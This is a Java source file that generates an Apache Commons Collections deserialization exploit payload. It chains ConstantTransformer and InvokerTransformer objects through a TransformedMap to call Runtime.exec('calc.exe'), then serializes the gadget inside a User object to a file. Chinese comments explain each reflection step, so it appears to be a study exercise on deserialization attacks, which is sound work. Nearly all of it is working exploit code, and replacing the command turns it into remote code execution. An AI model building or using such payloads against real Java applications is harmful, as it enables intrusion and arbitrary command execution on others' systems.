package run.ergou.deserialize.cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

public class CreatePayload {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                // Runtime.getRuntime().exec("calc.exe")

                // 将map value 转换为常量 Runtime.class
                new ConstantTransformer(Runtime.class),

                /*
                    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
                        super();
                        iMethodName = methodName;
                        iParamTypes = paramTypes;
                        iArgs = args;
                    }
                    invokerTransformer#transform方法：
                        Class cls = input.getClass();
                        Method method = cls.getMethod(iMethodName, iParamTypes);
                        return method.invoke(input, iArgs);
                    反射相关：
                        Class对象：
                            描述类的对象，包括类所拥有的方法、字段等
                        Class对象方法：
                            Method getMethod()：获得描述类所拥有的某个方法的Method对象
                            Method aMethod = aClass.getMethod(String name, Class[] parameterTypes)
                        Method对象方法：
                            Object invoke()：调用该Method对象所描述的类的某个方法
                            aMethod.invoke(Object obj, Object[] args) 即 obj.aMethod(Object[] args)

                    input = Runtime.class
                    cls = Runtime.class.getClass() = java.lang.Class
                    Method method = cls.getMethod("getMethod", new Class[]{String.class, Class[].class})
                    method.invoke(Runtime.class, new Object[]{"getRuntime", new Class[]{}}) 等价于
                    Runtime.class.getMethod("getRuntime", new Class[]{})

                    此时传入下一Transformer的对象为：java.lang.reflect.Method getRuntime
                */
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[]{}}
                ),

                /*
                    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
                        super();
                        iMethodName = methodName;
                        iParamTypes = paramTypes;
                        iArgs = args;
                    }
                    invokerTransformer#transform方法：
                        Class cls = input.getClass();
                        Method method = cls.getMethod(iMethodName, iParamTypes);
                        return method.invoke(input, iArgs);

                    input = java.lang.reflect.Method getRuntime
                    iMethodName = "invoke"
                    iParamTypes = Class[]{Object.class, Object[].class}
                    iArgs = Object[]{null, Object[]{}}

                    cls = getRuntimeMethod.getClass() = Class getRuntimeMethod 描述 描述getRuntime的Method 的Class对象
                    Method invokeMethod = cls.getMethod("invoke", Class[]{Object.class, Object[].class})
                    invokeMethod.invoke(getRuntimeMethod, Object[]{null, Object[]{}})
                    即
                    getRuntimeMethod.invoke(null, Object[]{})
                    即
                    getRuntime()

                    此时传入下一Transformer的对象为：Runtime对象
                 */
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[]{}}
                ),

                /*
                    input = Runtime对象
                    iMethodName = "exec"
                    iParamTypes = Class[]{String.class}
                    iArgs = Object[]{"calc.exe"}

                    cls = Runtime.getClass() 描述Runtime的Class对象
                    Method execMethod = cls.getMethod("exec", Class[]{String.class})
                    execMethod.invoke(Runtime, Object[]{"calc.exe"})
                    Runtime.exec("calc.exe")

                 */
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc.exe"}
                )
        };


        Map<Object, Object> map = new HashMap<>();

        Transformer valueTransformer = new ChainedTransformer(transformers);

        // 获得包含可控Transformer对象的Map/*TransformedMap*/
        Map transformedMap = TransformedMap.decorate(map, null, valueTransformer);

        User user = new User(transformedMap);

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(new File("cc")));
        oos.writeObject(user);
        oos.close();

    }
}
